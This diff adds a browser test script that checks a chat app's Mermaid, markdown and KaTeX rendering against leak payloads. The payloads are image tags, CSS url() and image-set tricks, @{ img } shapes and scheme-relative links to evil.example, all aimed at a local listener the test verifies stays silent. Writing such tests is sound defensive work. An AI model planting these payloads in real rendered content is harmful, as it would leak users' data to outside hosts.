@@ -1,0 +1,112 @@
+[
+ {
+  "nav": "/chat"
+ },
+ {
+  "wait": 1
+ },
+ {
+  "js": "'needs scripts/leak-listener.py 9299 and the fake-echo alias (scripts/chat-actions-setup.sh)'"
+ },
+ {
+  "js": "(async()=>{const P=\"Sec start.\\n\\n```mermaid\\ngraph TD\\nA[\\\"<img src='http://127.0.0.1:9299/leak-img.png?d=secret'>\\\"] --> B2\\n```\\n\\n```mermaid\\n%%{init: {\\\"themeCSS\\\": \\\".node rect { fill: url(http://127.0.0.1:9299/leak-css) }\\\"}}%%\\ngraph TD\\nC --> D\\n```\\n\\n```mermaid\\nflowchart TD\\nG@{ img: \\\"http://127.0.0.1:9299/leak-shape.png\\\", label: \\\"x\\\", pos: \\\"t\\\", w: 60, h: 60, constraint: \\\"off\\\" }\\nG --> H\\n```\\n\\n```mermaid\\ngraph TD\\nE --> F\\nstyle E fill:url(http://127.0.0.1:9299/leak-style)\\n```\\n\\n```mermaid\\ngraph TD\\nOK1[fine] --> OK2[also fine]\\n```\\n\\n```mermaid\\nsequenceDiagram\\nA->>B: hi\\nB-->>A: ok\\n```\\n\\n```mermaid\\nclassDiagram\\nAnimal <|-- Dog\\nAnimal : +int age\\n```\\n\\n```mermaid\\ngantt\\ndateFormat YYYY-MM-DD\\nsection S\\nTask :a1, 2026-01-01, 3d\\n```\\n\\n```mermaid\\npie title P\\n\\\"a\\\" : 3\\n\\\"b\\\" : 5\\n```\\n\\nLinks: [ext](https://example.org/x) [mail](mailto:a@b.c) [rel](/chat) end\\n\\nBig: $\\\\rule{2000em}{20000em}$ end\\n\";\nconst j=(u,b)=>fetch(u,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(b)});\nconst t=await (await j('/chat/api/threads',{model_alias:'fake-echo',kind:'chat'})).json();\nawait (await j(`/chat/api/threads/${t.id}/send`,{content:'seed'})).text();\nconst d=await (await fetch(`/chat/api/threads/${t.id}`)).json();\nconst a=d.messages.find(m=>m.role==='assistant');\nconst e=await j(`/chat/api/threads/${t.id}/messages/${a.id}/edit`,{content:P});\nreturn JSON.stringify([t.id,e.status])})()"
+ },
+ {
+  "nav": "/chat"
+ },
+ {
+  "wait": 5
+ },
+ {
+  "js": "(async()=>{try{return JSON.stringify(await (await fetch('http://127.0.0.1:9299/hits')).json())}catch(e){return 'listener down: '+e}})()"
+ },
+ {
+  "expect": "(async()=>{const r=await fetch('http://127.0.0.1:9299/hits');const h=await r.json();return Array.isArray(h)&&h.length===0})()",
+  "label": "no diagram made a request to a remote host (img label, themeCSS, @{ img }, style url())"
+ },
+ {
+  "expect": "!performance.getEntriesByType('resource').some(e=>e.name.includes(':9299/leak'))",
+  "label": "nor does the resource timeline list one"
+ },
+ {
+  "expect": "document.querySelectorAll('.msg-assistant .mermaid-error').length>=3",
+  "label": "the refused diagrams say so and keep their code block"
+ },
+ {
+  "expect": "[...document.querySelectorAll('.msg-assistant .mermaid-error')].every(e=>/external images/.test(e.textContent)||/error/i.test(e.textContent))",
+  "label": "the refusal note names external images"
+ },
+ {
+  "expect": "document.querySelectorAll('.msg-assistant .mermaid-view svg').length>=5",
+  "label": "flowchart, sequence, class, gantt and pie diagrams still render"
+ },
+ {
+  "expect": "![...document.querySelectorAll('.msg-assistant .mermaid-view')].some(v=>/<img|<image|foreignObject[^>]*>.*<img|url\\((?!#)/.test(v.innerHTML))",
+  "label": "no rendered diagram holds an image or external url()"
+ },
+ {
+  "expect": "[...document.querySelectorAll('.msg-assistant .md a')].filter(a=>/^(https?:|mailto:)/.test(a.getAttribute('href'))).every(a=>a.target==='_blank'&&/noopener/.test(a.rel))",
+  "label": "external reply links open in a new context"
+ },
+ {
+  "expect": "[...document.querySelectorAll('.msg-assistant .md a[href=\"/chat\"]')].every(a=>!a.target)",
+  "label": "an in-app relative link stays in the window"
+ },
+ {
+  "expect": "(()=>{const r=document.querySelector('.msg-assistant .katex-error, .msg-assistant .katex .rule');const s=document.getElementById('chat-scroll');return s.scrollHeight<20000})()",
+  "label": "an absurd \\rule does not make a huge scroll area (KaTeX maxSize)"
+ },
+ {
+  "shot": "chat-security"
+ },
+ {
+  "js": "'second pass: the CSP-era payloads (image-set, CSS escape, quoted YAML key, brace in a label), ordinary state/ER diagrams, scheme-relative links, a big matrix and an aligned block'"
+ },
+ {
+  "js": "(async()=>{const P=\"Sec two.\\n\\n```mermaid\\nstateDiagram-v2\\nclassDef bad fill:#f00,mask-image:image-set(\\\"http://127.0.0.1:9299/leak2-state-imageset\\\" 1x)\\n[*] --> S1\\nclass S1 bad\\n```\\n\\n```mermaid\\nstateDiagram-v2\\nclassDef esc fill:#0f0,mask-image:\\\\75 rl(http://127.0.0.1:9299/leak2-state-escape)\\n[*] --> S2\\nclass S2 esc\\n```\\n\\n```mermaid\\nflowchart TD\\nG@{ \\\"img\\\": \\\"http://127.0.0.1:9299/leak2-quoted-key.png\\\", label: \\\"x\\\", pos: \\\"t\\\", w: 60, h: 60, constraint: \\\"off\\\" }\\nG --> H\\n```\\n\\n```mermaid\\nflowchart TD\\nK@{ label: \\\"}\\\", img: \\\"http://127.0.0.1:9299/leak2-brace.png\\\", pos: \\\"t\\\", w: 60, h: 60, constraint: \\\"off\\\" }\\nK --> M\\n```\\n\\n```mermaid\\nstateDiagram-v2\\nclassDef good fill:#2b6cb0,color:#fff\\n[*] --> A1\\nA1 --> A2\\nclass A1 good\\nA2 --> [*]\\n```\\n\\n```mermaid\\nerDiagram\\nCUSTOMER ||--o{ ORDER : places\\nORDER ||--|{ LINE : contains\\n```\\n\\n```mermaid\\nflowchart TD\\nP1[a] --> P2[b]\\nstyle P1 fill:#2b6cb0,stroke:#333\\nclassDef k fill:#eee\\nclass P2 k\\n```\\n\\n[sr](//evil.example:9299/leak2-scheme-rel) [bs](\\\\\\\\evil.example:9299/leak2-bs) [ok](/chat)\\n\\nMatrix: $$\\\\begin{pmatrix} a & b & c \\\\\\\\ d & e & f \\\\\\\\ g & h & i \\\\end{pmatrix}$$\\n\\n$$\\\\begin{aligned} x &= 1 + 2 \\\\\\\\ y &= x^2 + \\\\frac{1}{2} \\\\end{aligned}$$\\n\\nend\\n\";\nconst j=(u,b)=>fetch(u,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(b)});\nconst t=await (await j('/chat/api/threads',{model_alias:'fake-echo',kind:'chat'})).json();\nawait (await j(`/chat/api/threads/${t.id}/send`,{content:'seed'})).text();\nconst d=await (await fetch(`/chat/api/threads/${t.id}`)).json();\nconst a=d.messages.find(m=>m.role==='assistant');\nconst e=await j(`/chat/api/threads/${t.id}/messages/${a.id}/edit`,{content:P});\nreturn JSON.stringify([t.id,e.status])})()"
+ },
+ {
+  "nav": "/chat"
+ },
+ {
+  "wait": 6
+ },
+ {
+  "js": "(async()=>JSON.stringify(await (await fetch('http://127.0.0.1:9299/hits')).json()))()"
+ },
+ {
+  "expect": "(async()=>{const h=await (await fetch('http://127.0.0.1:9299/hits')).json();return h.length===0})()",
+  "label": "image-set, CSS-escaped url(), quoted img key and brace-in-label payloads made no remote request"
+ },
+ {
+  "expect": "performance.getEntriesByType('resource').filter(e=>e.name.includes(':9299/leak')).every(e=>e.transferSize===0&&e.responseStatus===0)",
+  "label": "any attempt on the timeline was blocked by the CSP (mermaid builds its scratch DOM before the sanitiser runs): nothing transferred"
+ },
+ {
+  "expect": "document.querySelectorAll('.msg-assistant .mermaid-view svg').length>=3",
+  "label": "the ordinary state, ER and flowchart diagrams render"
+ },
+ {
+  "expect": "[...document.querySelectorAll('.msg-assistant .mermaid-view')].every(v=>!v.querySelector('use,set,animate,animateMotion,animateTransform,feImage,foreignObject,image,script'))",
+  "label": "the sanitised SVG holds none of the forbidden elements"
+ },
+ {
+  "expect": "[...document.querySelectorAll('.msg-assistant .mermaid-view *')].every(e=>[...e.attributes].every(a=>!/^on/i.test(a.name)))",
+  "label": "and no on* attribute"
+ },
+ {
+  "expect": "[...document.querySelectorAll('.msg-assistant .md a')].filter(a=>/evil/.test(a.textContent+a.href)).length===0&&[...document.querySelectorAll('.msg-assistant .md a')].filter(a=>['sr','bs'].includes(a.textContent)).every(a=>a.getAttribute('href')==='#')",
+  "label": "scheme-relative links (// and backslashes) are neutralised to #"
+ },
+ {
+  "expect": "document.querySelectorAll('.msg-assistant .katex').length>=2&&!document.querySelector('.msg-assistant .katex-error')",
+  "label": "a normal matrix and an aligned block render as KaTeX"
+ },
+ {
+  "expect": "(()=>{const m=[...document.querySelectorAll('.msg-assistant .katex-display')];return m.length>=2&&m.every(e=>e.getBoundingClientRect().height<400)})()",
+  "label": "and stay a sane size"
+ },
+ {
+  "shot": "chat-security-2"
+ }
+]
